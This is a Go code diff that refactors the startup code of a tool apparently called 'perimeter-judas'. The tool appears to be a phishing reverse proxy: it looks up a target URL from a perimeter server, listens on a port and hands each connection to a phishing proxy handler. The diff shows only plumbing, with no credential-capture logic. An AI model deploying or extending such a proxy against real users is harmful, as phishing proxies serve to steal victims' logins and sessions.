@@ -7,8 +7,11 @@ import (
 	"net"
 	"net/http"
 	"net/url"
-	"os"
 	"time"
+
+	"github.com/pkg/errors"
+
+	"github.com/velovec/perimeter/perimeter-judas/src/main/go/perimeter"
 )
 
 const (
@@ -18,44 +21,31 @@ const (
 
 var (
 	servicePort     = flag.Int("port", -1, "Target service port")
-	perimeterServer = flag.String("perimeter", "http://localhost:8080", "Perimeter Server URL")
+	perimeterServer = flag.String("perimeter", "http://localhost:8088", "Perimeter Server URL")
 )
 
-func exitWithError(message string) {
-	log.Println(message)
-	os.Exit(-1)
-}
-
-func setupRequiredFlags() {
+func initFlags() {
 	flag.Parse()
 
 	if *servicePort == -1 {
-		exitWithError("--port is required.")
+		log.Fatal("--port is required")
 	}
 }
 
-func main() {
-	setupRequiredFlags()
-
-
+func start() error {
 	perimeterServerUrl, err := url.Parse(*perimeterServer)
 	if err != nil {
-		exitWithError(err.Error())
+		return errors.Wrap(err, "Perimeter server url parse error")
 	}
 
-	var perimeterClient = &PerimeterClient{
-		perimeterServer: perimeterServerUrl,
-		servicePort:     *servicePort,
-	}
-
-	judasTarget, err := perimeterClient.GetTargetUrl()
+	p, err := perimeter.NewPerimeter(*perimeterServerUrl, *servicePort)
 	if err != nil {
-		exitWithError(err.Error())
+		return errors.Wrap(err, "Error crating perimeter")
 	}
 
-	judasTargetUrl, err := url.Parse(fmt.Sprintf("%s://%s:%d", judasTarget.Protocol, judasTarget.Host, judasTarget.Port))
+	judasTargetUrl, err := p.GetJudasUrl()
 	if err != nil {
-		exitWithError(err.Error())
+		return errors.Wrap(err, "Error getting judas target url")
 	}
 
 	client := &http.Client{
@@ -77,14 +67,10 @@ func main() {
 
 	server, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *servicePort))
 	if err != nil {
-		exitWithError(err.Error())
+		return errors.Wrap(err, "Error listening")
 	}
 
 	log.Println(fmt.Sprintf("Listening on: http://0.0.0.0:%d", *servicePort))
-
-	transactions := make(chan HTTPTransaction)
-
-	go perimeterClient.ProcessTransactions(transactions)
 
 	for {
 		conn, err := server.Accept()
@@ -94,6 +80,13 @@ func main() {
 			continue
 		}
 
-		go phishingProxy.HandleConnection(conn, transactions)
+		go phishingProxy.HandleConnection(conn, p)
+	}
+}
+
+func main() {
+	initFlags()
+	if err := start(); err != nil {
+		log.Fatalf("ERROR: %v", err)
 	}
 }
